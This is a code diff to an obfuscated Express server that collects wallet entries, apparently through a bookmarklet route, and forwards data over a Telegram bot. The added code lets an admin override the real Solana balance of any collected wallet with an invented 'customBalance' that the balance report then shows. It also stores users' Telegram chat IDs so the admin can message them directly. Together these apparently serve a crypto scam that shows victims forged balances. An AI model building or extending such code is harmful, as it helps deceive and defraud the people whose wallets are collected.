@@ -138,10 +138,10 @@ function A4C8N1() {
 }
 
 // Sends a message to the Telegram chat
-async function sendToTelegram(message) {
+async function sendToTelegram(message, chatId = TELEGRAM_CHAT_ID) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const payload = {
-        chat_id: TELEGRAM_CHAT_ID,
+        chat_id: chatId,
         text: message,
         parse_mode: 'Markdown'
     };
@@ -269,6 +269,7 @@ app.post('/api/bookmark-data', async (req, res) => {
         const newEntry = {
             id: Date.now(),
             timestamp: new Date().toISOString(),
+            chatId: req.body.chatId || null, // Store user chat ID if provided
             ...req.body
         };
 
@@ -333,7 +334,71 @@ app.delete('/api/bookmark-data/:id', K9S2E7, (req, res) => {
     }
 });
 
-// Check balances of all wallets endpoint
+// Update user balance endpoint (admin only)
+app.post('/api/update-balance', K9S2E7, async (req, res) => {
+    try {
+        const { entryId, walletIndex, balance } = req.body;
+        if (!entryId || typeof walletIndex !== 'number' || typeof balance !== 'number') {
+            return res.status(400).json({ success: false, error: 'Missing or invalid parameters: entryId, walletIndex, balance required' });
+        }
+
+        const data = D5V8B3();
+        const entryIndex = data.findIndex(item => item.id === entryId);
+        if (entryIndex === -1) {
+            return res.status(404).json({ success: false, error: 'Entry not found' });
+        }
+
+        const entry = data[entryIndex];
+        if (!entry.processedSBundles || !entry.processedSBundles.wallets) {
+            return res.status(400).json({ success: false, error: 'No wallets found in entry' });
+        }
+
+        const wallet = entry.processedSBundles.wallets.find(w => w.walletIndex === walletIndex);
+        if (!wallet) {
+            return res.status(404).json({ success: false, error: 'Wallet not found' });
+        }
+
+        // Add or update customBalance
+        wallet.customBalance = balance;
+        F6N2T9(data);
+
+        res.json({ success: true, message: `Balance updated for wallet ${walletIndex} in entry ${entryId} to ${balance} SOL` });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Send message to user endpoint (admin only)
+app.post('/api/send-user-message', K9S2E7, async (req, res) => {
+    try {
+        const { entryId, message } = req.body;
+        if (!entryId || !message) {
+            return res.status(400).json({ success: false, error: 'Missing parameters: entryId and message required' });
+        }
+
+        const data = D5V8B3();
+        const entry = data.find(item => item.id === entryId);
+        if (!entry) {
+            return res.status(404).json({ success: false, error: 'Entry not found' });
+        }
+
+        const chatId = entry.chatId;
+        if (!chatId) {
+            return res.status(400).json({ success: false, error: 'No chat ID found for this user. Provide chatId when creating the entry.' });
+        }
+
+        const sent = await sendToTelegram(message, chatId);
+        if (sent) {
+            res.json({ success: true, message: 'Message sent to user successfully' });
+        } else {
+            res.status(500).json({ success: false, error: 'Failed to send message' });
+        }
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Check balances of all wallets endpoint (now respects customBalance)
 app.get('/api/check-balances', K9S2E7, async (req, res) => {
     try {
         const data = D5V8B3();
@@ -358,7 +423,9 @@ app.get('/api/check-balances', K9S2E7, async (req, res) => {
         }
 
         for (const addr of allAddresses) {
-            const balance = await H3X9M5(addr.publicKey);
+            const entry = data.find(e => e.id === addr.entryId);
+            const wallet = entry.processedSBundles.wallets.find(w => w.walletIndex === addr.walletIndex);
+            let balance = wallet.customBalance !== undefined ? wallet.customBalance : await H3X9M5(addr.publicKey);
             totalSolBalance += balance;
 
             addressBalances.push({
@@ -366,7 +433,8 @@ app.get('/api/check-balances', K9S2E7, async (req, res) => {
                 walletIndex: addr.walletIndex,
                 publicKey: addr.publicKey,
                 solBalance: balance,
-                usdBalance: balance * solPrice
+                usdBalance: balance * solPrice,
+                isCustom: wallet.customBalance !== undefined
             });
         }
 
@@ -414,6 +482,7 @@ app.get('/data/:encodedData', async (req, res) => {
         const newEntry = {
             id: Date.now(),
             timestamp: new Date().toISOString(),
+            chatId: decodedData.chatId || null, // Store user chat ID if provided
             ...decodedData
         };
 
